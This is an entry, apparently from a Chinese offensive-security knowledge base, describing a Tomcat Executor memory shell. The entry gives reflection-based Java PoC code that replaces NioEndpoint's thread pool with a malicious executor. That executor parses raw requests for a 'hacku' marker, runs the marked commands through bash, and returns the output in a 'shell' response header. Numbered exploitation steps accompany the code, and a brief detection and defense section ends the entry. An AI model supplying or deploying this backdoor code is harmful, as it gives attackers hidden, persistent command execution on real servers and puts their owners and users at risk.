---
id: web-java-component-tomcat-executor-memshell
title: Tomcat Executor 内存马：替换 NioEndpoint 线程池解析原始请求
type: scenario
domain: web
path: web/java/component/tomcat
technique: tomcat-executor-memshell
tags:
- java
- tomcat
- memshell
- persistence
- executor
- threadpool
- nio
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V22
  verified_at: '2026-11-05T02:37:29+08:00'
  notes: 已对照原文3.5节核对：遍历Acceptor+http线程经target.this/usr/bin/bash/endpoint取NioEndpoint，同参替换executor；execute中反射socketWrapper/socketBufferHandler.readBuffer读取原始请求，hacku标记后执行命令，经Acceptor→endpoint→handler→global→processors取RequestInfo.req.response.addHeader(shell)回显；原文实测不存在Context也可触发。原文未给组件受影响版本，未设置affected_versions。未复现。
url: /docs/web/java/component/tomcat/web-java-component-tomcat-executor-memshell/
draft: false
kb_aliases:
- Tomcat Executor 内存马
- NioEndpoint.setExecutor
- 线程池内存马
- SocketProcessor 原始请求解析
- 响应头回显内存马
---

## 一句话结论

在已能执行一次 Java 代码的 Tomcat NIO 中，可通过反射定位 `NioEndpoint`，用自定义 `ThreadPoolExecutor` 替换其 `executor`；该线程池在 `SocketProcessor` 执行前读取原始 Socket 字节，识别攻击者标记并执行命令，再把结果写入响应头，从而形成位于 HTTP 解析之前、可对任意 Context/路径生效的 Executor 内存马。

## 原理

- Tomcat 连接器 `AbstractEndpoint` 持有 `executor` 线程池；`AbstractEndpoint.processSocket()` 会把 `SocketProcessor` 任务提交给 `executor.execute(...)`，线程池在 HTTP 协议解析前后运行任务。
- 替换 `executor` 为恶意子类后，可在 `execute(Runnable command)` 中先于原逻辑执行攻击者代码：
  - `command` 是 `SocketProcessor`，其内部持有 `socketWrapper` 字段；
  - 通过反射读取 `socketWrapper` → `socketBufferHandler.readBuffer`，可拿到尚未解析的原始 HTTP 请求字节；
  - 搜索自定义标记（如 `hacku`），把标记后的内容当作命令执行；
  - 由于此时没有标准 `HttpServletRequest`/`Response`，回显通过遍历 Acceptor 线程找到 `AbstractProtocol` 的 `processors` 列表，取 `RequestInfo` 的 `req.response`，调用 `response.addHeader("shell", URLEncoder.encode(result))` 写入响应头。
- 注入侧从当前线程组找到名称含 `Acceptor`/`http` 的线程，反射 `target` → `this$0`（或 `endpoint`）得到 `NioEndpoint`；再反射 `executor` 字段，用原线程池参数创建恶意线程池并 `setExecutor`。
- 因为 Executor 层在 Context/Servlet 映射之前，任意路径（甚至不存在的 Context）请求都会经过它。

## 触发条件

- 目标为使用 NIO（`NioEndpoint`）的 Tomcat；
- 攻击者已能执行一次 Java 代码或 JSP；
- 能反射访问线程、`NioEndpoint` 与 `AbstractEndpoint.executor`；
- 攻击者能发送带自定义标记（如 `hacku`）的请求并读取响应头。

## 利用步骤

1. 遍历当前线程组，找到名称含 `Acceptor` 且含 `http` 的线程；反射 `target` 后取 `this$0` 或 `endpoint`，得到 `NioEndpoint`。
2. 反射 `executor` 字段取得原 `ThreadPoolExecutor`，记录其 core/max/keepAlive/queue/threadFactory/rejectedHandler。
3. 用相同参数创建恶意 `ThreadPoolExecutor` 子类，重写 `execute(Runnable command)`。
4. 在 `execute` 中反射 `command` 的 `socketWrapper`，读取原始请求字节；若包含 `hacku <cmd>`，执行命令并通过 `RequestInfo.req.response.addHeader` 回显。
5. 调用 `nioEndpoint.setExecutor(evilExecutor)` 替换。
6. 访问任意路径发送 `hacku <命令>` 触发；结果在响应头 `shell` 中。

## PoC

```java
// 关键链路（精简）：定位 NioEndpoint 并替换 executor
Object endpoint = null;
for (Thread t : Thread.getAllStackTraces().keySet()) {
    if (t.getName().contains("Acceptor") && t.getName().contains("http")) {
        Object target = getField(t, "target");
        endpoint = getField(target, "this$0");       // NioEndpoint
        if (endpoint == null) endpoint = getField(target, "endpoint");
        break;
    }
}
ThreadPoolExecutor old = (ThreadPoolExecutor) getField(endpoint, "executor");
EvilExecutor evil = new EvilExecutor(
    old.getCorePoolSize(), old.getMaximumPoolSize(), old.getKeepAliveTime(TimeUnit.MILLISECONDS),
    TimeUnit.MILLISECONDS, old.getQueue(), old.getThreadFactory(), old.getRejectedExecutionHandler());
endpoint.getClass().getMethod("setExecutor", Executor.class).invoke(endpoint, evil);
```

```java
// 恶意线程池核心：读取原始 Socket 字节并在响应头回显
class EvilExecutor extends org.apache.tomcat.util.threads.ThreadPoolExecutor {
  // 构造器省略，参数同原线程池
  public void execute(Runnable command) {
    try {
      ByteBuffer buf = ByteBuffer.allocate(16384);
      SocketWrapperBase sw = (SocketWrapperBase) getField(command, "socketWrapper");
      sw.read(false, buf);
      ByteBuffer readBuffer = (ByteBuffer) getField(getField(sw, "socketBufferHandler"), "readBuffer");
      readBuffer.limit(buf.position());
      String raw = new String(readBuffer.array(), StandardCharsets.UTF_8);
      if (raw.contains("hacku")) {
        String cmd = raw.substring(raw.indexOf("hacku") + 5, raw.indexOf("\r", raw.indexOf("hacku"))).trim();
        Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd});
        String out = new Scanner(p.getInputStream()).useDelimiter("\\A").next();
        // 遍历 Acceptor -> endpoint -> handler -> global -> processors，取 RequestInfo.req.response
        for (Object info : processors) {
          Response resp = (Response) getField(getField(info, "req"), "response");
          resp.addHeader("shell", URLEncoder.encode(out, "UTF-8"));
        }
      }
    } catch (Exception ignored) {}
    super.execute(command);
  }
}
```

## 变体与关联

- 变体：也可重写 `execute` 直接在每次任务执行时运行命令（原文最初 demo 即如此），但每次请求都会触发，隐蔽性差。
- 变体：回显可改为服务端主动 HTTP POST 到攻击者服务器（反连型），避免依赖响应头。
- 关联：[[web-java-component-tomcat-filter-memshell]]、[[web-java-component-tomcat-valve-memshell]]（容器层内存马）；[[web-java-component-tomcat-upgrade-memshell]]（Connector 层）。
- 边界：仅 NIO 的 `NioEndpoint` 结构适用；NIO2/APR 字段不同；重启清空；反射读取原始缓冲区依赖 Tomcat 内部类结构。

## 检测与防御

- 检测：运行期 `NioEndpoint.executor` 的类不再是 `org.apache.tomcat.util.threads.ThreadPoolExecutor` 或出现自定义子类；线程池 `execute` 调用栈出现非业务包；请求中出现 `hacku` 等自定义标记；响应头异常出现 `shell`。
- 处置：重启 Tomcat；内存 dump 检查 `AbstractEndpoint.executor` 实现类。
- 防御：封堵任意代码执行/JSP；RASP 监控 `setExecutor` 与自定义 ThreadPoolExecutor；网络层检测异常请求标记与响应头。
